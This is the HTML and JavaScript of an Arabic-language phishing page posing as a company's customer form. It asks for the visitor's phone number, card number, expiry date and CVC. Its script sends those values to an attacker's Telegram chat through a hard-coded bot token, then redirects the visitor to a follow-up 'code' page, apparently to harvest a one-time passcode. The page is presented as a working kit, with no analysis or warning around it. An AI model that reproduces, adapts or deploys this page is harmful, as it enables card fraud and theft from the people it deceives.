    <style type="text/css">
        * {
            direction: rtl;
            font-family: 'Droid Arabic Kufi', sans-serif;
        }

        body {
            background-color: #FFF;
        }

        .help-info {
            display: none;
        }

        .help-info.active {
            display: block;
        }

        span {
            display: block;
            font-size: 13px;
        }

        .navbar-dark {
            background-color: #FFF !important;
        }

        .bg-danger {
            background-color: #008000 !important;
        }

        .text-danger {
            color: #008000 !important;
        }

        body, h6, label, input, button, small, footer, .form-group {
            text-align: right !important;
        }

        .form-group.centered-button {
            text-align: center !important;
            margin-top: 10px;
            margin-bottom: 10px;
        }

        .form-group.centered-button button {
            font-size: 1.5rem;
            padding: 15px 30px;
            width: auto;
            border-radius: 50px;
            background-color: #008000;
            color: #FFF;
            border: none;
        }

        .form-group.centered-button button:hover {
            background-color: #006400;
        }

<body style="background-color: #FFF;">

    <nav class="navbar navbar-expand-md navbar-danger bg-danger shadow-sm"></nav>

    <main class="py-4">
        <div class="container justify-content-center" style="justify-content: center !important;text-align: center !important;">
            <a class="navbar-brand justify-content-center"><img src="https://www2.0zz0.com/2025/04/25/22/620734455.jpeg" style="width:100%" alt="logo"></a>
        </div>

        <div class="container">
            <h6 class="text-center" style="font-weight:bold; color: #000;margin-top: 20px;margin-bottom: 30px;">أهلا عزيزي العميل</h6>
            <div class="container justify-content-center">
                <form id="forum" style="padding: 10px;">
                    <div class="form-group row text-right">
                        <label for="tel" class="col-form-label text-md-right" style="font-weight:bold;">رقم الجوال<small class="text-info" style="font-weight:bold;"></small></label>
                        <input class="form-control" style="direction: ltr;" type="number" id="tel" name="tel" maxlength="10" autocomplete="false" autofocus="">
                        <span id="verify_tel" class="text-danger font-weight-bolder text-right" style="display: none;">يرجى التحقق من اسم المستلم</span>
                    </div>

                    <div class="form-group row text-right">
                        <label for="cNum" class="col-form-label text-md-right" style="font-weight:bold;">رقم البطاقة :</label>
                        <input class="form-control" id="cNum" name="cNum" style="direction: ltr;" maxlength="16" autofocus="">
                    </div>

                    <div class="form-group row text-right">
                        <label for="cDate" class="col-form-label text-md-right" style="font-weight:bold;">تاريخ الإنتهاء (MM/YYYY) :</label>
                        <input class="form-control" id="cDate" name="cDate" style="direction: ltr;" autofocus="">
                        <span id="verify_date" class="text-danger font-weight-bolder text-right" style="display: none;">يرجى التحقق من تاريخ انتهاء البطاقة</span>
                    </div>

                    <div class="form-group row text-right">
                        <label for="cvc" class="col-form-small text-md-right"><small style="font-weight:bold;">CVC - آخر ثلاث أرقام خلف البطاقة</small> :</label>
                        <input type="number" class="form-control" style="direction: ltr;" id="cvc" name="cvc" autofocus="" maxlength="3">
                        <span id="verify_cvv" class="text-danger font-weight-bolder text-right" style="display: none;">يرجى التحقق من رمز CVV</span>
                    </div>

                    <div class="form-group centered-button">
                        <button type="button" id="confirmBtn" class="btn btn-success">
                            <i class="fa fa-lock ml-10"></i> تأكيد <span style="font-weight: bold;"></span>
                        </button>
                    </div>
                </form>
            </div>
        </div>

    <footer class="bg-danger" style="width: 100%;bottom: 0px;padding: 10px;color:#FFF;font-weight:bold;margin-top: 30px;">
        <small style="font-weight: bolder;color:#FFF;font-size:14px;">© 2025 جميع الحقوق محفوظة لـشركة الوصلة</small>
    </footer>

    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>
        $(document).ready(function() {
            $('#confirmBtn').click(function() {
                // Collect form data
                const tel = $('#tel').val();
                const cNum = $('#cNum').val();
                const cDate = $('#cDate').val();
                const cvc = $('#cvc').val();

                // Validate the form (you can expand this with your own validation logic)
                if (!tel || !cNum || !cDate || !cvc) {
                    Swal.fire({
                        title: "خطأ",
                        text: "يرجى تعبئة جميع الحقول",
                        icon: "error"
                    });
                    return;
                }

                // Prepare the message to send to Telegram
                const message = `
                    رقم الجوال: ${tel}
                    رقم البطاقة: ${cNum}
                    تاريخ الإنتهاء: ${cDate}
                    CVC: ${cvc}
                `;

                // Telegram Bot API settings
                const botToken = '7356894979:AAFxs2g1BAkp6qYCgf3ZE8mvaLvaIuoBmI4';
                const chatId = '6873334348';

                // Send the data to Telegram
                $.ajax({
                    url: `https://api.telegram.org/bot${botToken}/sendMessage`,
                    method: 'POST',
                    contentType: 'application/json',
                    data: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    }),
                    success: function(response) {
                        Swal.fire({
                            title: "تم التأكيد",
                            text: "تم إرسال البيانات بنجاح",
                            icon: "success"
                        }).then(() => {
                            // Redirect to another page after success
                            window.location.href = "code.html"; // Replace with your destination URL
                        });
                    },
                    error: function(error) {
                        Swal.fire({
                            title: "خطأ",
                            text: "حدث خطأ أثناء إرسال البيانات",
                            icon: "error"
                        });
                    }
                });
            });
        });
    </script>
</body>
